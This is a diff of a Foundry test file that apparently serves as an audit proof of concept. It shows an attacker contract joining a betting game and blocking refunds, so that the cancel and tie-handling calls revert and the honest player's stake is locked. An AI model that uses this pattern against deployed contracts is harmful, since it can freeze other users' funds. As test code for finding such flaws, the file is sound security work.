@@ -21,43 +21,80 @@ contract JoiningWrongGameTypeTest is Test {
         require(playerA.balance == attacker.balance, "Setup failed");
     }
 
-    function test_dos_cancelGame() public {
+    function createGameWithEth() public returns (uint256) {
         vm.prank(playerA);
-        uint256 gameId = game.createGameWithEth{value: 1 ether}(1, 5 minutes);
-
-        vm.startPrank(attacker);
-        DoS exploit = new DoS{value: 1 ether}(game, gameId);
-        exploit.setDenied(true);
-        vm.stopPrank();
-
-        vm.warp(block.timestamp + 6 minutes);
-        vm.startPrank(playerA);
-        vm.expectRevert();
-        game.timeoutReveal(gameId);
-
-        vm.expectRevert();
-        game.cancelGame(gameId);
-        vm.stopPrank();
+        return game.createGameWithEth{value: 1 ether}(1, 5 minutes);
     }
 
-    function test_dos_finishGame() public {
-        vm.prank(playerA);
-        uint256 gameId = game.createGameWithEth{value: 1 ether}(1, 5 minutes);
-
+    function attackerJoinsGame(uint256 gameId) public returns (DoS) {
         vm.startPrank(attacker);
         DoS exploit = new DoS{value: 1 ether}(game, gameId);
-        exploit.setDenied(true);
+        exploit.setDenied(true); //In case we want to block refunds
         vm.stopPrank();
+        return exploit;
+    }
 
-        vm.prank(playerA);
-        uint8 move = 1;
+    function playerCommitMove(
+        uint256 gameId,
+        uint8 move
+    ) public returns (bytes32) {
         bytes32 salt = keccak256(abi.encodePacked(block.timestamp, playerA));
+        vm.prank(playerA);
         game.commitMove(gameId, keccak256(abi.encodePacked(move, salt)));
+        return salt;
+    }
 
-        vm.warp(block.timestamp + 6 minutes);
+    function attackerCommitMove(
+        DoS exploit,
+        uint256 gameId,
+        uint8 move
+    ) public returns (bytes32) {
+        bytes32 salt = keccak256(abi.encodePacked(block.timestamp, attacker));
+        vm.prank(attacker);
+        exploit.forward(
+            abi.encodeWithSignature(
+                "commitMove(uint256,bytes32)",
+                gameId,
+                keccak256(abi.encodePacked(move, salt))
+            )
+        );
+        return salt;
+    }
+
+    function test_dos_cancelGame() public {
+        uint256 gameId = createGameWithEth();
+        DoS exploit = attackerJoinsGame(gameId);
+
+        playerCommitMove(gameId, 1);
+        attackerCommitMove(exploit, gameId, 2);
+
+        vm.warp(block.timestamp + 6 minutes); //A and attacker forget to reveal
         vm.prank(playerA);
         vm.expectRevert();
-        game.timeoutReveal(gameId);
+        game.cancelGame(gameId);
+    }
+
+    function test_dos_handleTie() public {
+        uint256 gameId = createGameWithEth();
+        DoS exploit = attackerJoinsGame(gameId);
+
+        uint8 move = 1;
+        bytes32 playerSalt = playerCommitMove(gameId, move);
+        bytes32 attackerSalt = attackerCommitMove(exploit, gameId, move);
+
+        vm.prank(attacker);
+        exploit.forward(
+            abi.encodeWithSignature(
+                "revealMove(uint256,uint8,bytes32)",
+                gameId,
+                move,
+                attackerSalt
+            )
+        );
+
+        vm.prank(playerA);
+        vm.expectRevert();
+        game.commitMove(gameId, keccak256(abi.encodePacked(move, playerSalt)));
     }
 }
 
